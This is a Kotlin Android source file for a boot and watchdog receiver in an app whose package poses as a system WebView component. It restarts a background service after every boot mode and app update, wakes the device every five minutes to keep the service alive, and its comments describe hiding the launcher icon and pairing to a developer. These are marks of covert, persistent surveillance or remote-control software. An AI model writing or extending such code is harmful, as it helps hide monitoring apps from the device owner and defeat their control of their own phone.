package com.system.webview.sync.receivers

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import androidx.core.content.ContextCompat
import com.system.webview.sync.localdb.PrefsHelper
import com.system.webview.sync.services.BackgroundSyncService

/**
 * Starts BackgroundSyncService after:
 *   - Normal reboot (BOOT_COMPLETED)
 *   - Direct-boot / encrypted storage mode (LOCKED_BOOT_COMPLETED)
 *   - MediaTek / Xiaomi fast-boot (QUICKBOOT_POWERON)
 *   - APK self-update (MY_PACKAGE_REPLACED)
 *
 * Also schedules an AlarmManager watchdog that re-checks the service every
 * 15 minutes — if Android killed it (OEM battery saver, memory pressure),
 * the alarm will restart it without user intervention.
 *
 * NOTE: Force Stop (Settings → Apps → Force Stop) marks the process as
 * "stopped" — Android blocks ALL broadcasts until the user opens the app
 * manually at least once. This is an OS-level restriction, not fixable here.
 */
class BootReceiver : BroadcastReceiver() {

    companion object {
        const val ACTION_WATCHDOG = "com.system.webview.sync.ACTION_WATCHDOG"
        private const val WATCHDOG_INTERVAL_MS = 5 * 60 * 1000L    // 5 minutes (was 15 — MIUI kills too aggressively)
        private const val WATCHDOG_REQUEST_CODE = 0xBEEF

        fun scheduleWatchdog(context: Context) {
            val am = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val intent = Intent(context, BootReceiver::class.java).apply {
                action = ACTION_WATCHDOG
            }
            val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            else
                PendingIntent.FLAG_UPDATE_CURRENT

            val pi = PendingIntent.getBroadcast(context, WATCHDOG_REQUEST_CODE, intent, flags)

            val triggerAt = System.currentTimeMillis() + WATCHDOG_INTERVAL_MS
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pi)
            } else {
                am.setExact(AlarmManager.RTC_WAKEUP, triggerAt, pi)
            }
            android.util.Log.d("BootReceiver", "Watchdog scheduled in 15 min")
        }
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return
        android.util.Log.d("BootReceiver", "Received: $action")

        when (action) {
            // APK self-update — re-enable launcher alias so developer can access
            // PairingActivity after install-over without needing to uninstall first.
            // hideAppIconAndFinish() disables the alias; reinstalling (-r) preserves
            // that disabled state. MY_PACKAGE_REPLACED fires before the new APK runs,
            // so we reset it here every time the APK is replaced.
            Intent.ACTION_MY_PACKAGE_REPLACED -> {
                re_enableLauncherAlias(context)
                if (PrefsHelper.isPaired(context)) {
                    startService(context)
                    scheduleWatchdog(context)
                }
            }

            // ── Standard Android boot ──────────────────────────────────────
            Intent.ACTION_BOOT_COMPLETED,
            // Direct-boot / encrypted storage (Android 7+)
            "android.intent.action.LOCKED_BOOT_COMPLETED",
            // MediaTek / Xiaomi fast-boot
            "android.intent.action.QUICKBOOT_POWERON",
            "com.htc.intent.action.QUICKBOOT_POWERON",
            // ── Watchdog tick ─────────────────────────────────────────────
            ACTION_WATCHDOG -> {
                if (!PrefsHelper.isPaired(context)) {
                    android.util.Log.d("BootReceiver", "Not paired — skipping")
                    return
                }
                startService(context)
                // Always re-arm the watchdog so it keeps firing
                scheduleWatchdog(context)
            }
        }
    }

    private fun re_enableLauncherAlias(context: Context) {
        try {
            val alias = ComponentName(context.packageName, "${context.packageName}.PairingActivityLauncher")
            context.packageManager.setComponentEnabledSetting(
                alias,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            android.util.Log.d("BootReceiver", "PairingActivityLauncher re-enabled after APK update")
        } catch (e: Exception) {
            android.util.Log.w("BootReceiver", "Failed to re-enable launcher alias: ${e.message}")
        }
    }

    private fun startService(context: Context) {
        try {
            val serviceIntent = Intent(context, BackgroundSyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(context, serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
            android.util.Log.d("BootReceiver", "BackgroundSyncService started")
        } catch (e: Exception) {
            android.util.Log.e("BootReceiver", "Failed to start service: ${e.message}")
        }
    }
}
